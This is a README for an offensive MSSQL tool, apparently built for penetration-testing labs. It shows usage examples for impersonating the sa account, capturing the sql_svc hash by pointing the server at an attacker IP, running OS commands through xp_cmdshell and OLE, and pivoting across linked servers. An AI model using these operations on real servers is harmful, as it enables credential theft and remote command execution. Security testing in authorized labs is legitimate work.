# MSSQL Tool

This tool uses Kerberos to establish a connection with the database. The tool enables the enumeration of permissions, execution of SQL queries on the database, and execution of system commands on the server

## Usage

```
MSSQL.exe <SQLServer> <Database> <Operation> [/impersonate <user>]
```

## Operations

- `enum` - Perform SQL enumeration.
- `query <query>` - Execute a custom SQL query.
- `gethash <kali_ip>` - Obtain **sql_svc** hash.
- `linked <server> <query>` - Execute a SQL query on a linked server.
- `xp_cmdshell <cmd>` - Execute an OS command.
- `xp_cmdshell_linked <server> <cmd>` - Execute an OS command on a linked server.
- `ole_cmd <cmd>` - Execute an OS command using OLE.

## Examples

#### Perform SQL enumeration (checking the current user, checking roles, checking impersonation possibilities, checking linked servers)
```
MSSQL.exe dc01.corp1.com master enum
```

#### Execute a custom SQL query with impersonation
```
MSSQL.exe dc01.corp1.com master query "SELECT * FROM Users" /impersonate sa
```
#### Obtain sql_svc hash
```
MSSQL.exe dc01.corp1.com master gethash 192.168.45.228
```
#### Execute a query on a linked server with impersonation
```
MSSQL.exe dc01.corp1.com master linked "DC01" "SELECT SYSTEM_USER" /impersonate sa
```
#### Execute an OS command using xp_cmdshell with impersonation
```
MSSQL.exe dc01.corp1.com master xp_cmdshell "whoami" /impersonate sa
```
#### Execute an OS command on a linked server using xp_cmdshell with impersonation
```
MSSQL.exe dc01.corp1.com master xp_cmdshell_linked "DC01" "whoami" /impersonate sa
```
#### Execute an OS command using OLE with impersonation
```
MSSQL.exe dc01.corp1.com master ole_cmd "whoami" /impersonate sa
```